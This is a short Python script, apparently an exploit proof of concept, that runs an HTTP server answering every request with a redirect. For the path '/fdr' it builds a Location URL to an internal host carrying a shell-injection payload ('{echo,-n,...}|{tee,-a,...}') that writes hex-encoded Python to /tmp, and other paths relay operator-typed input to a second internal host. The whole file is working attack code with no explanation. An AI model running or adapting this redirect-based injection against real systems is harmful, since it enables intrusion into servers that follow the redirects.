import os
import readline
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
import binascii

filename = "/tmp/file.txt"
contents = b"open('/tmp/proof','w').write('iwashere')"

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.do_POST()

    def do_POST(self):
        self.send_response(302)
        if self.path == '/fdr':
            self.send_header('Location', "http://172.20.4.8:23/;{echo,-n,%s}|{tee,-a,%s};" % (binascii.hexlify(contents).decode(), filename))
        else:
            self.send_header('Location', 'http://172.20.4.2:9981/' + urllib.parse.quote(input((urllib.parse.unquote(self.path[5:]))+"\n")))
        self.end_headers()


HTTPServer(("", 80), Redirect).serve_forever()
